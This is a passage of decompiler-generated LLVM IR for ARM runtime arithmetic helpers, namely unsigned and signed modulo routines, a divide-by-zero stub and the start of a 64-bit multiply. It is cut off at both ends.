  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_124f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124e0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1259c = udiv i32 %arg1, %arg2
  ret i32 %v2_1259c
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_125b0 = add i32 %arg2, -1
  %v2_125b0 = icmp eq i32 %arg2, 0
  br i1 %v2_125b0, label %dec_label_pc_1266c, label %dec_label_pc_125b8

dec_label_pc_125b8:                               ; preds = %entry
  %v7_125b0 = icmp eq i32 %arg2, 1
  br i1 %v7_125b0, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_125b8
  %v1_125b8 = load i32, i32* @r0, align 4
  %v10_125b8 = icmp eq i32 %v1_125b8, %arg2
  br i1 %v10_125b8, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_125b8, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_125b8 = icmp ult i32 %v1_125b8, %arg2
  br i1 %v4_125b8, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_125c0 = and i32 %v1_125b0, %arg2
  %v8_125c0 = icmp eq i32 %v6_125c0, 0
  br i1 %v8_125c0, label %.thread67, label %dec_label_pc_125d0.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_125c4 = phi i32 [ %v1_125b8, %bb75 ], [ 0, %.thread65 ]
  %v3_125c4 = and i32 %v1_125c4, %v1_125b0
  br label %bb76

dec_label_pc_125d0.preheader:                     ; preds = %bb75
  %v2_125d099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_125d099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_12660, %bb74, %bb89, %bb84, %dec_label_pc_12630, %.thread67
  %v5_125c8 = phi i32 [ %v1_125b8, %bb74 ], [ %v3_125c4, %.thread67 ], [ %v1_1260c.v6_1260c.v6_12614.v6_1261c, %dec_label_pc_12630 ], [ 0, %bb84 ], [ %v1_12664, %dec_label_pc_12660 ], [ %v2_12660, %bb89 ]
  ret i32 %v5_125c8

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_125d0.preheader
  %v0_125e4.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_125d0.preheader ], [ %v4_125d8, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_125d0.preheader ], [ %v2_125dc11, %.thread1.thread9 ]
  br label %dec_label_pc_125e4thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_125d0.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_125dc11, %.thread1.thread9 ], [ 0, %dec_label_pc_125d0.preheader ]
  %v0_125e4.pr33100 = phi i32 [ %v4_125d8, %.thread1.thread9 ], [ %arg2, %dec_label_pc_125d0.preheader ]
  %v4_125d4 = icmp ult i32 %v0_125e4.pr33100, %v1_125b8
  br i1 %v4_125d4, label %bb78, label %dec_label_pc_125e4thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_125d8 = and i32 %v0_125e4.pr33100, 268435456
  %v3_125d8 = icmp eq i32 %v2_125d8, 0
  %v4_125d8 = mul i32 %v0_125e4.pr33100, 16
  br i1 %v3_125d8, label %.thread1.thread9, label %dec_label_pc_125e4.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_125dc11 = add i32 %storemerge101, 4
  %v2_125d0 = icmp ugt i32 %v4_125d8, 268435455
  br i1 %v2_125d0, label %.thread, label %bb77

dec_label_pc_125e4thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_125e4thread-pre-split.loopexit

dec_label_pc_125e4thread-pre-split.loopexit:      ; preds = %dec_label_pc_125e4thread-pre-split.loopexit.loopexit, %.thread
  %v0_125e4.pr3398 = phi i32 [ %v0_125e4.pr33.lcssa, %.thread ], [ %v0_125e4.pr33100, %dec_label_pc_125e4thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_125e4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_125e4thread-pre-split

dec_label_pc_125e4thread-pre-split:               ; preds = %.thread4, %dec_label_pc_125e4thread-pre-split.loopexit
  %v1_125f039 = phi i32 [ %storemerge95, %dec_label_pc_125e4thread-pre-split.loopexit ], [ %v2_125f0, %.thread4 ]
  %v0_125e4.pr = phi i32 [ %v0_125e4.pr3398, %dec_label_pc_125e4thread-pre-split.loopexit ], [ %v3_125ec, %.thread4 ]
  br label %dec_label_pc_125e4

dec_label_pc_125e4.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_125e4

dec_label_pc_125e4:                               ; preds = %dec_label_pc_125e4.loopexit, %dec_label_pc_125e4thread-pre-split
  %v0_125f8.pr = phi i32 [ %v1_125f039, %dec_label_pc_125e4thread-pre-split ], [ %storemerge101, %dec_label_pc_125e4.loopexit ]
  %v1_125ec = phi i32 [ %v0_125e4.pr, %dec_label_pc_125e4thread-pre-split ], [ %v4_125d8, %dec_label_pc_125e4.loopexit ]
  %v2_125e4 = icmp slt i32 %v1_125ec, 0
  br i1 %v2_125e4, label %dec_label_pc_125f8, label %bb79

bb79:                                             ; preds = %dec_label_pc_125e4
  %v4_125e8 = icmp ult i32 %v1_125ec, %v1_125b8
  br i1 %v4_125e8, label %.thread4, label %dec_label_pc_125f8

.thread4:                                         ; preds = %bb79
  %v3_125ec = mul i32 %v1_125ec, 2
  %v2_125f0 = add i32 %v0_125f8.pr, 1
  br label %dec_label_pc_125e4thread-pre-split

dec_label_pc_125f8:                               ; preds = %bb79, %dec_label_pc_125e4
  %v2_125f8 = add i32 %v0_125f8.pr, -3
  %v5_125fc = icmp slt i32 %v0_125f8.pr, 3
  br i1 %v5_125fc, label %dec_label_pc_1263c, label %dec_label_pc_12600

dec_label_pc_12600:                               ; preds = %dec_label_pc_125f8, %bb83
  %v6_12628 = phi i32 [ %v0_12630, %bb83 ], [ %v2_125f8, %dec_label_pc_125f8 ]
  %v1_12604 = phi i32 [ %v1_1260c.v6_1260c.v6_12614.v6_1261c, %bb83 ], [ %v1_125b8, %dec_label_pc_125f8 ]
  %v3_1262412 = phi i32 [ %v3_12624, %bb83 ], [ %v1_125ec, %dec_label_pc_125f8 ]
  %v3_12600 = icmp ult i32 %v1_12604, %v3_1262412
  %v3_12604 = select i1 %v3_12600, i32 0, i32 %v3_1262412
  %v1_1260c = sub i32 %v1_12604, %v3_12604
  %v4_12608 = udiv i32 %v3_1262412, 2
  %v6_12608 = icmp ult i32 %v1_1260c, %v4_12608
  %v6_1260c = select i1 %v6_12608, i32 0, i32 %v4_12608
  %v1_1260c.v6_1260c = sub i32 %v1_1260c, %v6_1260c
  %.demorgan = and i1 %v3_12600, %v6_12608
  %v4_12610 = udiv i32 %v3_1262412, 4
  %v6_12610 = icmp ult i32 %v1_1260c.v6_1260c, %v4_12610
  %v6_12614 = select i1 %v6_12610, i32 0, i32 %v4_12610
  %v1_1260c.v6_1260c.v6_12614 = sub i32 %v1_1260c.v6_1260c, %v6_12614
  %.demorgan71 = and i1 %.demorgan, %v6_12610
  %v4_12618 = udiv i32 %v3_1262412, 8
  %v6_12618 = icmp ult i32 %v1_1260c.v6_1260c.v6_12614, %v4_12618
  %v6_1261c = select i1 %v6_12618, i32 0, i32 %v4_12618
  %v1_1260c.v6_1260c.v6_12614.v6_1261c = sub i32 %v1_1260c.v6_1260c.v6_12614, %v6_1261c
  %.demorgan72 = and i1 %.demorgan71, %v6_12618
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_12600
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_12600, %bb80
  %v2_12620 = add i32 %v1_1260c.v6_1260c.v6_12614.v6_1261c, -1
  %v4_12620 = sub i32 0, %v1_1260c.v6_1260c.v6_12614.v6_1261c
  %v5_12620 = and i32 %v1_1260c.v6_1260c.v6_12614.v6_1261c, %v4_12620
  %v3_12624 = udiv i32 %v3_1262412, 16
  %v5_12628 = icmp slt i32 %v1_1260c.v6_1260c.v6_12614.v6_1261c, 1
  br i1 %v5_12628, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_12628 = add i32 %v6_12628, -4
  %v9_12628 = sub i32 3, %v6_12628
  %v10_12628 = and i32 %v9_12628, %v6_12628
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_12630 = phi i32 [ %v6_12628, %bb81 ], [ %v7_12628, %bb82 ]
  %v0_1262c15.in = phi i32 [ %v2_12620, %bb81 ], [ %v7_12628, %bb82 ]
  %v1_1262c14.in = phi i32 [ %v5_12620, %bb81 ], [ %v10_12628, %bb82 ]
  %v1_1262c14 = icmp slt i32 %v1_1262c14.in, 0
  %v0_1262c15 = icmp slt i32 %v0_1262c15.in, 0
  %v2_1262c = xor i1 %v0_1262c15, %v1_1262c14
  br i1 %v2_1262c, label %dec_label_pc_12630, label %dec_label_pc_12600

dec_label_pc_12630:                               ; preds = %bb83
  %v1_12630 = urem i32 %v0_12630, 4
  %v2_12630 = icmp eq i32 %v1_12630, 0
  br i1 %v2_12630, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_12630
  %v3_12634 = icmp eq i32 %v1_1260c.v6_1260c.v6_12614.v6_1261c, 0
  br i1 %v3_12634, label %bb76, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %bb84, %dec_label_pc_125f8
  %v0_12650 = phi i32 [ %v3_12624, %bb84 ], [ %v1_125ec, %dec_label_pc_125f8 ]
  %v1_1264c = phi i32 [ %v1_1260c.v6_1260c.v6_12614.v6_1261c, %bb84 ], [ %v1_125b8, %dec_label_pc_125f8 ]
  %v0_1263c = phi i32 [ %v0_12630, %bb84 ], [ %v2_125f8, %dec_label_pc_125f8 ]
  %v5_12640 = icmp slt i32 %v0_1263c, -2
  br i1 %v5_12640, label %dec_label_pc_12660, label %dec_label_pc_12644

dec_label_pc_12644:                               ; preds = %dec_label_pc_1263c
  %v8_1263c = icmp eq i32 %v0_1263c, -2
  br i1 %v8_1263c, label %dec_label_pc_12654, label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %dec_label_pc_12644
  %v3_12648 = icmp ult i32 %v1_1264c, %v0_12650
  br i1 %v3_12648, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_12648
  %v2_12648 = sub i32 %v1_1264c, %v0_12650
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12648, %bb85
  %v0_1265452 = phi i32 [ %v1_1264c, %dec_label_pc_12648 ], [ %v2_12648, %bb85 ]
  %v3_12650 = udiv i32 %v0_12650, 2
  br label %dec_label_pc_12654

dec_label_pc_12654:                               ; preds = %dec_label_pc_12644, %bb86
  %v0_1265c = phi i32 [ %v0_12650, %dec_label_pc_12644 ], [ %v3_12650, %bb86 ]
  %v1_12658 = phi i32 [ %v1_1264c, %dec_label_pc_12644 ], [ %v0_1265452, %bb86 ]
  %v3_12654 = icmp ult i32 %v1_12658, %v0_1265c
  br i1 %v3_12654, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_12654
  %v2_12654 = sub i32 %v1_12658, %v0_1265c
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_12654, %bb87
  %v0_1266055 = phi i32 [ %v1_12658, %dec_label_pc_12654 ], [ %v2_12654, %bb87 ]
  %v3_1265c = udiv i32 %v0_1265c, 2
  br label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_1263c, %bb88
  %v2_12664 = phi i32 [ %v0_12650, %dec_label_pc_1263c ], [ %v3_1265c, %bb88 ]
  %v1_12664 = phi i32 [ %v1_1264c, %dec_label_pc_1263c ], [ %v0_1266055, %bb88 ]
  %v3_12660 = icmp ult i32 %v1_12664, %v2_12664
  br i1 %v3_12660, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_12660
  %v2_12660 = sub i32 %v1_12664, %v2_12664
  br label %bb76

dec_label_pc_1266c:                               ; preds = %entry
  %v0_1266c = load i32, i32* @lr, align 4
  %v0_12670 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1266c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12664, { 1, 2, 0 }
  uselistorder i32 %v0_12650, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12630, { 1, 0, 2 }
  uselistorder i32 %v7_12628, { 1, 0 }
  uselistorder i32 %v3_12624, { 1, 0 }
  uselistorder i32 %v1_1260c.v6_1260c.v6_12614.v6_1261c, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_12618, { 1, 0 }
  uselistorder i32 %v4_12610, { 1, 0 }
  uselistorder i32 %v4_12608, { 1, 0 }
  uselistorder i32 %v6_12628, { 3, 0, 2, 1 }
  uselistorder i32 %v2_125f8, { 1, 0 }
  uselistorder i32 %v1_125ec, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_125d8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_125e4.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_125b8, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_12660, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_12654, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_12600, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1267c = icmp eq i32 %arg2, 0
  br i1 %v2_1267c, label %dec_label_pc_12750, label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %entry
  %v1_1267c = icmp slt i32 %arg2, 0
  br i1 %v1_1267c, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_12684
  %v2_12684 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_12684, %bb
  %v4_1269c = phi i32 [ %arg2, %dec_label_pc_12684 ], [ %v2_12684, %bb ]
  %v0_12688 = load i32, i32* @r0, align 4
  %v1_12688 = icmp slt i32 %v0_12688, 0
  br i1 %v1_12688, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_1268c = sub i32 0, %v0_12688
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_12694 = phi i32 [ %v0_12688, %bb79 ], [ %v2_1268c, %bb80 ]
  %v1_12690 = add i32 %v4_1269c, -1
  %v7_12690 = icmp eq i32 %v4_1269c, 1
  br i1 %v7_12690, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_12694 = icmp eq i32 %v1_12694, %v4_1269c
  br i1 %v10_12694, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_12694 = icmp ult i32 %v1_12694, %v4_1269c
  br i1 %v4_12694, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_1269c = and i32 %v1_12690, %v4_1269c
  %v8_1269c = icmp eq i32 %v6_1269c, 0
  br i1 %v8_1269c, label %.thread72, label %dec_label_pc_126ac.preheader

dec_label_pc_126ac.preheader:                     ; preds = %bb84
  %v2_126ac109 = icmp ugt i32 %v4_1269c, 268435455
  br i1 %v2_126ac109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_126a064 = phi i32 [ %v1_12694, %bb84 ], [ 0, %.thread70 ]
  %v3_126a0 = and i32 %v1_126a064, %v1_12690
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_126ac.preheader
  %v0_126c0.pr35.lcssa = phi i32 [ %v4_1269c, %dec_label_pc_126ac.preheader ], [ %v4_126b4, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_126ac.preheader ], [ %v2_126b89, %.thread2.thread7 ]
  br label %dec_label_pc_126c0thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_126ac.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_126b89, %.thread2.thread7 ], [ 0, %dec_label_pc_126ac.preheader ]
  %v0_126c0.pr35110 = phi i32 [ %v4_126b4, %.thread2.thread7 ], [ %v4_1269c, %dec_label_pc_126ac.preheader ]
  %v4_126b0 = icmp ult i32 %v0_126c0.pr35110, %v1_12694
  br i1 %v4_126b0, label %bb86, label %dec_label_pc_126c0thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_126b4 = and i32 %v0_126c0.pr35110, 268435456
  %v3_126b4 = icmp eq i32 %v2_126b4, 0
  %v4_126b4 = mul i32 %v0_126c0.pr35110, 16
  br i1 %v3_126b4, label %.thread2.thread7, label %dec_label_pc_126c0.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_126b89 = add i32 %storemerge111, 4
  %v2_126ac = icmp ugt i32 %v4_126b4, 268435455
  br i1 %v2_126ac, label %.thread1, label %bb85

dec_label_pc_126c0thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_126c0thread-pre-split.loopexit

dec_label_pc_126c0thread-pre-split.loopexit:      ; preds = %dec_label_pc_126c0thread-pre-split.loopexit.loopexit, %.thread1
  %v0_126c0.pr35108 = phi i32 [ %v0_126c0.pr35.lcssa, %.thread1 ], [ %v0_126c0.pr35110, %dec_label_pc_126c0thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_126c0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_126c0thread-pre-split

dec_label_pc_126c0thread-pre-split:               ; preds = %.thread4, %dec_label_pc_126c0thread-pre-split.loopexit
  %v1_126cc41 = phi i32 [ %storemerge105, %dec_label_pc_126c0thread-pre-split.loopexit ], [ %v2_126cc, %.thread4 ]
  %v2_126c436 = phi i32 [ %v1_12694, %dec_label_pc_126c0thread-pre-split.loopexit ], [ %v2_126c4, %.thread4 ]
  %v0_126c0.pr = phi i32 [ %v0_126c0.pr35108, %dec_label_pc_126c0thread-pre-split.loopexit ], [ %v3_126c8, %.thread4 ]
  br label %dec_label_pc_126c0

dec_label_pc_126c0.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_126c0

dec_label_pc_126c0:                               ; preds = %dec_label_pc_126c0.loopexit, %dec_label_pc_126c0thread-pre-split
  %v0_126d4.pr = phi i32 [ %v1_126cc41, %dec_label_pc_126c0thread-pre-split ], [ %storemerge111, %dec_label_pc_126c0.loopexit ]
  %v2_126c4 = phi i32 [ %v2_126c436, %dec_label_pc_126c0thread-pre-split ], [ %v1_12694, %dec_label_pc_126c0.loopexit ]
  %v1_126c8 = phi i32 [ %v0_126c0.pr, %dec_label_pc_126c0thread-pre-split ], [ %v4_126b4, %dec_label_pc_126c0.loopexit ]
  %v2_126c0 = icmp slt i32 %v1_126c8, 0
  br i1 %v2_126c0, label %dec_label_pc_126d4, label %bb87

bb87:                                             ; preds = %dec_label_pc_126c0
  %v4_126c4 = icmp ult i32 %v1_126c8, %v2_126c4
  br i1 %v4_126c4, label %.thread4, label %dec_label_pc_126d4

.thread4:                                         ; preds = %bb87
  %v3_126c8 = mul i32 %v1_126c8, 2
  %v2_126cc = add i32 %v0_126d4.pr, 1
  br label %dec_label_pc_126c0thread-pre-split

dec_label_pc_126d4:                               ; preds = %bb87, %dec_label_pc_126c0
  %v2_126d4 = add i32 %v0_126d4.pr, -3
  %v5_126d8 = icmp slt i32 %v0_126d4.pr, 3
  br i1 %v5_126d8, label %dec_label_pc_12718, label %dec_label_pc_126dc

dec_label_pc_126dc:                               ; preds = %dec_label_pc_126d4, %bb91
  %v6_12704 = phi i32 [ %v0_1270c, %bb91 ], [ %v2_126d4, %dec_label_pc_126d4 ]
  %v1_126e0 = phi i32 [ %v1_126e8.v6_126e8.v6_126f0.v6_126f8, %bb91 ], [ %v2_126c4, %dec_label_pc_126d4 ]
  %v3_1270010 = phi i32 [ %v3_12700, %bb91 ], [ %v1_126c8, %dec_label_pc_126d4 ]
  %v3_126dc = icmp ult i32 %v1_126e0, %v3_1270010
  %v3_126e0 = select i1 %v3_126dc, i32 0, i32 %v3_1270010
  %v1_126e8 = sub i32 %v1_126e0, %v3_126e0
  %v4_126e4 = udiv i32 %v3_1270010, 2
  %v6_126e4 = icmp ult i32 %v1_126e8, %v4_126e4
  %v6_126e8 = select i1 %v6_126e4, i32 0, i32 %v4_126e4
  %v1_126e8.v6_126e8 = sub i32 %v1_126e8, %v6_126e8
  %.demorgan = and i1 %v3_126dc, %v6_126e4
  %v4_126ec = udiv i32 %v3_1270010, 4
  %v6_126ec = icmp ult i32 %v1_126e8.v6_126e8, %v4_126ec
  %v6_126f0 = select i1 %v6_126ec, i32 0, i32 %v4_126ec
  %v1_126e8.v6_126e8.v6_126f0 = sub i32 %v1_126e8.v6_126e8, %v6_126f0
  %.demorgan76 = and i1 %.demorgan, %v6_126ec
  %v4_126f4 = udiv i32 %v3_1270010, 8
  %v6_126f4 = icmp ult i32 %v1_126e8.v6_126e8.v6_126f0, %v4_126f4
  %v6_126f8 = select i1 %v6_126f4, i32 0, i32 %v4_126f4
  %v1_126e8.v6_126e8.v6_126f0.v6_126f8 = sub i32 %v1_126e8.v6_126e8.v6_126f0, %v6_126f8
  %.demorgan77 = and i1 %.demorgan76, %v6_126f4
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_126dc
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_126dc, %bb88
  %v2_126fc = add i32 %v1_126e8.v6_126e8.v6_126f0.v6_126f8, -1
  %v4_126fc = sub i32 0, %v1_126e8.v6_126e8.v6_126f0.v6_126f8
  %v5_126fc = and i32 %v1_126e8.v6_126e8.v6_126f0.v6_126f8, %v4_126fc
  %v3_12700 = udiv i32 %v3_1270010, 16
  %v5_12704 = icmp slt i32 %v1_126e8.v6_126e8.v6_126f0.v6_126f8, 1
  br i1 %v5_12704, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_12704 = add i32 %v6_12704, -4
  %v9_12704 = sub i32 3, %v6_12704
  %v10_12704 = and i32 %v9_12704, %v6_12704
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_1270c = phi i32 [ %v6_12704, %bb89 ], [ %v7_12704, %bb90 ]
  %v0_1270813.in = phi i32 [ %v2_126fc, %bb89 ], [ %v7_12704, %bb90 ]
  %v1_1270812.in = phi i32 [ %v5_126fc, %bb89 ], [ %v10_12704, %bb90 ]
  %v1_1270812 = icmp slt i32 %v1_1270812.in, 0
  %v0_1270813 = icmp slt i32 %v0_1270813.in, 0
  %v2_12708 = xor i1 %v0_1270813, %v1_1270812
  br i1 %v2_12708, label %dec_label_pc_1270c, label %dec_label_pc_126dc

dec_label_pc_1270c:                               ; preds = %bb91
  %v1_1270c = urem i32 %v0_1270c, 4
  %v2_1270c = icmp eq i32 %v1_1270c, 0
  br i1 %v2_1270c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_1270c
  %v3_12710 = icmp eq i32 %v1_126e8.v6_126e8.v6_126f0.v6_126f8, 0
  br i1 %v3_12710, label %.thread6, label %dec_label_pc_12718

dec_label_pc_12718:                               ; preds = %bb92, %dec_label_pc_126d4
  %v0_1272c = phi i32 [ %v3_12700, %bb92 ], [ %v1_126c8, %dec_label_pc_126d4 ]
  %v1_12728 = phi i32 [ %v1_126e8.v6_126e8.v6_126f0.v6_126f8, %bb92 ], [ %v2_126c4, %dec_label_pc_126d4 ]
  %v0_12718 = phi i32 [ %v0_1270c, %bb92 ], [ %v2_126d4, %dec_label_pc_126d4 ]
  %v5_1271c = icmp slt i32 %v0_12718, -2
  br i1 %v5_1271c, label %dec_label_pc_1273c, label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_12718
  %v8_12718 = icmp eq i32 %v0_12718, -2
  br i1 %v8_12718, label %dec_label_pc_12730, label %dec_label_pc_12724

dec_label_pc_12724:                               ; preds = %dec_label_pc_12720
  %v3_12724 = icmp ult i32 %v1_12728, %v0_1272c
  br i1 %v3_12724, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_12724
  %v2_12724 = sub i32 %v1_12728, %v0_1272c
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_12724, %bb93
  %v0_1273054 = phi i32 [ %v1_12728, %dec_label_pc_12724 ], [ %v2_12724, %bb93 ]
  %v3_1272c = udiv i32 %v0_1272c, 2
  br label %dec_label_pc_12730

dec_label_pc_12730:                               ; preds = %dec_label_pc_12720, %bb94
  %v0_12738 = phi i32 [ %v0_1272c, %dec_label_pc_12720 ], [ %v3_1272c, %bb94 ]
  %v1_12734 = phi i32 [ %v1_12728, %dec_label_pc_12720 ], [ %v0_1273054, %bb94 ]
  %v3_12730 = icmp ult i32 %v1_12734, %v0_12738
  br i1 %v3_12730, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_12730
  %v2_12730 = sub i32 %v1_12734, %v0_12738
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_12730, %bb95
  %v0_1273c57 = phi i32 [ %v1_12734, %dec_label_pc_12730 ], [ %v2_12730, %bb95 ]
  %v3_12738 = udiv i32 %v0_12738, 2
  br label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %dec_label_pc_12718, %bb96
  %v2_12740 = phi i32 [ %v0_1272c, %dec_label_pc_12718 ], [ %v3_12738, %bb96 ]
  %v1_12740 = phi i32 [ %v1_12728, %dec_label_pc_12718 ], [ %v0_1273c57, %bb96 ]
  %v3_1273c = icmp ult i32 %v1_12740, %v2_12740
  br i1 %v3_1273c, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_1273c
  %v2_1273c = sub i32 %v1_12740, %v2_12740
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1273c, %bb83, %.thread72, %dec_label_pc_1270c, %bb92, %bb97
  %v1_12748 = phi i32 [ %v1_126e8.v6_126e8.v6_126f0.v6_126f8, %dec_label_pc_1270c ], [ 0, %bb92 ], [ %v1_12740, %dec_label_pc_1273c ], [ %v2_1273c, %bb97 ], [ %v3_126a0, %.thread72 ], [ %v1_12694, %bb83 ]
  br i1 %v1_12688, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_12748 = sub i32 0, %v1_12748
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_1274c = phi i32 [ %v1_12748, %.thread6 ], [ %v2_12748, %bb98 ]
  ret i32 %v1_1274c

dec_label_pc_12750:                               ; preds = %entry
  %v0_12750 = load i32, i32* @lr, align 4
  %v0_12754 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12750)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1272c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1270c, { 1, 0, 2 }
  uselistorder i32 %v7_12704, { 1, 0 }
  uselistorder i32 %v3_12700, { 1, 0 }
  uselistorder i32 %v1_126e8.v6_126e8.v6_126f0.v6_126f8, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_126f4, { 1, 0 }
  uselistorder i32 %v4_126ec, { 1, 0 }
  uselistorder i32 %v4_126e4, { 1, 0 }
  uselistorder i32 %v6_12704, { 3, 0, 2, 1 }
  uselistorder i32 %v2_126d4, { 1, 0 }
  uselistorder i32 %v1_126c8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_126c4, { 1, 0, 3, 2 }
  uselistorder i32 %v4_126b4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_126c0.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12694, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_1269c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1273c, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12730, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_126dc, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_12760 = load i32, i32* @r0, align 4
  ret i32 %v1_12760
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_12770 = udiv i32 %arg1, 65536
  %v3_12774 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_12770, -65536
  %v5_12778 = add i32 %tmp, -1
